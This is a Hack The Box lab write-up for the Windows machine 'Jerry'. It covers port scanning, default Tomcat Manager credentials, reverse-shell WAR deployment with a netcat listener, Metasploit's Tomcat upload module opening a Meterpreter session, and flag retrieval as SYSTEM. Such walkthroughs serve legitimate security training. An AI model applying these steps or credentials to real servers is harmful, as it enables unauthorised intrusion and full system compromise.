# Jerry

**Jerry** is a Windows-based Hack The Box machine that focuses on web service enumeration, Apache Tomcat administration, weak/default credentials, WAR file deployment, and obtaining a system-level shell.

**Target IP:** `10.129.136.9`

---

## Overview

| Information     | Details                             |
| --------------- | ----------------------------------- |
| Machine         | Jerry                               |
| Platform        | Windows                             |
| Target IP       | `10.129.136.9`                      |
| Difficulty      | Not specified in the notes          |
| Initial Access  | Apache Tomcat Manager               |
| Credentials     | `tomcat:s3cret`                     |
| Initial Shell   | Windows command shell / Meterpreter |
| Privilege Level | `NT AUTHORITY\SYSTEM`               |
| Root Access     | Successful                          |

### Attack Path

```text
Full Port Scan
      ↓
Port 8080
      ↓
Apache Tomcat 7.0.88
      ↓
Tomcat Manager
      ↓
Weak Credentials
tomcat:s3cret
      ↓
WAR File Deployment
      ↓
Reverse Shell
      ↓
Meterpreter Session
      ↓
Local Exploit Suggester
      ↓
Windows Shell
      ↓
NT AUTHORITY\SYSTEM
      ↓
Flags
```

---

# 1. Enumeration

## Full Port Scan

We begin with a full TCP port scan against the target.

```bash
nmap -p- 10.129.136.9
```

The scan reveals only one open TCP port:

```text
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

Port `8080` is therefore the primary attack surface.

---

## Service and Version Detection

We perform service and version detection against the discovered port.

```bash
nmap -sC -sV -p8080 10.129.136.9
```

### Results

```text
PORT     STATE SERVICE REASON          VERSION
8080/tcp open  http    syn-ack ttl 127 Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
```

The scan identifies:

```text
Apache Tomcat 7.0.88
```

This gives us a clear direction for further web enumeration.

---

# 2. Web Enumeration

We access the web service running on port `8080`.

For easier navigation, we add the hostname to `/etc/hosts`:

```text
10.129.136.9    jerry.htb
```

The web server is running:

```text
Apache Tomcat 7.0.88
```

The Tomcat installation also exposes the **Manager** interface, which allows authenticated users to manage and deploy web applications.

This is particularly interesting because a Tomcat Manager account with sufficient privileges can potentially be used to deploy a malicious WAR application.

---

# 3. Initial Foothold

## Tomcat Manager Credentials

We test commonly used/default Tomcat credentials against the Manager interface.

The credentials:

```text
Username: tomcat
Password: s3cret
```

are accepted.

We now have authenticated access to the Tomcat Manager as the `tomcat` user.

---

## WAR File Deployment

A `.war` file, or **Web Application Archive**, can be deployed through the Tomcat Manager interface.

We prepare a reverse-shell WAR application and upload it through the Manager panel.

After deployment, the application can be accessed through the corresponding application path:

```text
http://jerry.htb:<PORT>/rev.war
```

We start a Netcat listener:

```bash
rlwrap nc -lvnp 4444
```

Once the deployed application is accessed, we receive a connection from the target:

```text
Listening on 0.0.0.0 4444
Connection received on 10.129.136.9 49192

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```

We now have command execution on the Windows target.

---

# 4. Metasploit Alternative

The manual WAR deployment method works, but the same attack can also be automated using Metasploit.

We use the Tomcat Manager upload module:

```text
exploit/multi/http/tomcat_mgr_upload
```

We configure the discovered credentials:

```text
set HttpPassword s3cret
set HttpUsername tomcat
```

We then run the exploit.

```text
run
```

Metasploit successfully authenticates to the Manager interface, uploads a WAR application, executes it, and establishes a Meterpreter session.

```text
[*] Started reverse TCP handler on 10.10.15.95:5555
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying BWGfttIX3ovgnFYWSPlY7xn...
[*] Executing BWGfttIX3ovgnFYWSPlY7xn...
[*] Sending stage (58073 bytes) to 10.129.136.9
[*] Undeploying BWGfttIX3ovgnFYWSPlY7xn ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened
```

We now have:

```text
Meterpreter session 1
```

---

# 5. User Context

We check the current account from Meterpreter:

```text
getuid
```

Output:

```text
Server username: JERRY$
```

The Meterpreter session is running under the machine account context.

At this stage, we begin investigating possible privilege escalation paths.

---

# 6. Privilege Escalation Enumeration

We use Metasploit's Local Exploit Suggester:

```text
use post/multi/recon/local_exploit_suggester
```

We set the active session to `1` and run the module.

The scan identifies one potentially vulnerable module:

```text
exploit/windows/persistence/accessibility_features_debugger
```

The result indicates:

```text
Potentially Vulnerable: Yes
The target appears to be vulnerable. Likely exploitable
```

The notes indicate that this particular technique requires an RDP scenario, so instead of continuing with it, we use the existing Meterpreter session to spawn a Windows command shell.

---

# 7. Obtaining a Windows Shell

From Meterpreter:

```text
shell
```

A Windows command shell is created:

```text
Process 28 created.
Channel 29 created.

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\>
```

We initially try:

```text
getuid
```

However, `getuid` is a Meterpreter command and is not available inside the Windows command shell:

```text
'getuid' is not recognized as an internal or external command,
operable program or batch file.
```

Instead, we use the Windows `whoami` command:

```cmd
whoami
```

Output:

```text
nt authority\system
```

This confirms that we already have the highest Windows privilege level:

```text
NT AUTHORITY\SYSTEM
```

---

# 8. Root/System Access

Since the shell is running as `NT AUTHORITY\SYSTEM`, we can access the Administrator's desktop.

```cmd
cd C:\Users\Administrator\Desktop\flags
```

The directory contains the flag file:

```text
2 for the price of 1.txt
```

We read it using the Windows `type` command:

```cmd
type "2 for the price of 1.txt"
```

The flags are successfully retrieved.

---

# Attack Path Summary

```text
10.129.136.9
      │
      ▼
Full TCP Port Scan
      │
      ▼
8080/tcp
      │
      ▼
Apache Tomcat 7.0.88
      │
      ▼
Tomcat Manager
      │
      ▼
Weak Credentials
tomcat:s3cret
      │
      ▼
WAR File Deployment
      │
      ▼
Reverse Shell
      │
      ▼
Meterpreter Session
      │
      ▼
Local Exploit Enumeration
      │
      ▼
Windows Command Shell
      │
      ▼
whoami
      │
      ▼
NT AUTHORITY\SYSTEM
      │
      ▼
Administrator Desktop
      │
      ▼
Flags
```

---

# Key Takeaways

* A full port scan can quickly identify the primary exposed service.
* Version detection helped identify the exact Apache Tomcat version.
* Administrative web interfaces should always be tested for weak or default credentials.
* Tomcat Manager access can provide powerful application deployment capabilities.
* WAR files can be used to deploy web applications to a Tomcat server.
* Metasploit can automate the Tomcat Manager upload and deployment process.
* Always verify the privilege level of a newly obtained shell.
* On Windows, `whoami` is a useful command for checking the current security context.
* `NT AUTHORITY\SYSTEM` represents the highest local privilege level on the Windows system.

---

# Tools Used

| Tool                 | Purpose                                               |
| -------------------- | ----------------------------------------------------- |
| Nmap                 | Port and service enumeration                          |
| Burp Suite           | Web application assessment                            |
| Netcat               | Reverse shell listener                                |
| rlwrap               | Improved shell interaction                            |
| Metasploit Framework | Tomcat exploitation and post-exploitation enumeration |
| Windows CMD          | System enumeration and flag retrieval                 |

---

# Conclusion

Jerry demonstrates how an exposed administrative web interface can become the entry point into a Windows system.

The attack started with full port enumeration, which revealed Apache Tomcat running on port `8080`. Further web enumeration identified the Tomcat Manager interface, where weak credentials provided authenticated access.

From there, a WAR application was deployed to obtain a reverse shell. The same process was also demonstrated using Metasploit's Tomcat Manager upload module.

After obtaining a Meterpreter session, local enumeration was performed and a Windows shell was spawned. Verification with `whoami` confirmed that the session was already running as `NT AUTHORITY\SYSTEM`, allowing direct access to the Administrator's desktop and the machine's flags.

The machine highlights the importance of **secure administrative credentials, restricted management interfaces, and careful enumeration of exposed web services**.
